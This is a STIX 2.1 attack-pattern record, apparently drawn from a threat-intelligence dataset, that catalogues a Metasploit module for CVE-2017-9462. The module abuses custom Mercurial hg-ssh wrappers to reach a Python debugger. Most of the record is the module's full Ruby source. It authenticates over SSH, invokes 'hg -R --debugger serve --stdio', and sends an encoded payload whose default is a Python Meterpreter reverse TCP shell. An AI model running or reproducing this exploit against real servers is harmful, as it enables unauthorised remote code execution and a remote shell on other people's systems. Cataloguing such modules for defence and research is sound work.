{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--111804ff-e2f3-4a56-bba6-73ff9c852602",
    "created": "2024-08-14T16:58:05.493419Z",
    "modified": "2024-08-14T16:58:05.493423Z",
    "name": "Mercurial Custom hg-ssh Wrapper Remote Code Exec",
    "description": " This module takes advantage of custom hg-ssh wrapper implementations that don't adequately validate parameters passed to the hg binary, allowing users to trigger a Python Debugger session, which allows arbitrary Python code execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/mercurial_ssh_exec.rb",
            "external_id": "mercurial_ssh_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9462"
        },
        {
            "source_name": "reference",
            "url": "https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mercurial Custom hg-ssh Wrapper Remote Code Exec',\n        'Description' => %q{\n          This module takes advantage of custom hg-ssh wrapper implementations that don't\n          adequately validate parameters passed to the hg binary, allowing users to trigger a\n          Python Debugger session, which allows arbitrary Python code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'claudijd',\n        ],\n        'References' => [\n          [ 'CVE', '2017-9462' ],\n          ['URL', 'https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29']\n        ],\n        'DefaultOptions' => {\n          'Payload' => 'python/meterpreter/reverse_tcp'\n        },\n        'Platform' => ['python'],\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [ ['Automatic', {}] ],\n        'Privileged' => false,\n        'DisclosureDate' => '2017-04-18',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [ true, 'The username for authentication', 'root' ]),\n        OptPath.new('SSH_PRIV_KEY_FILE', [ true, 'The path to private key for ssh auth', '' ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def ssh_priv_key\n    File.read(datastore['SSH_PRIV_KEY_FILE'])\n  end\n\n  def exploit\n    ssh_options = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      key_data: [ ssh_priv_key ],\n      port: rport\n    })\n\n    ssh_options.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"#{rhost}:#{rport} - Attempting to login...\")\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, username, ssh_options)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication due wrong credentials.\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n    # rubocop:disable Lint/ShadowingOuterLocalVariable\n    if ssh\n      print_good('SSH connection is established.')\n      ssh.open_channel do |ch|\n        ch.exec 'hg -R --debugger serve --stdio' do |ch, _success|\n          ch.on_extended_data do |ch, _type, data|\n            if data.match(/entering debugger/)\n              print_good(\"Triggered Debugger (#{data})\")\n              ch.send_data \"#{payload.encoded}\\n\"\n            else\n              print_error(\"Unable to trigger debugger (#{data})\")\n            end\n          end\n        end\n      end\n      # rubocop:enable Lint/ShadowingOuterLocalVariable\n      begin\n        ssh.loop unless session_created?\n      rescue Errno::EBADF => e\n        elog(e)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-18",
    "x_mitre_platforms": [
        "['python']"
    ]
}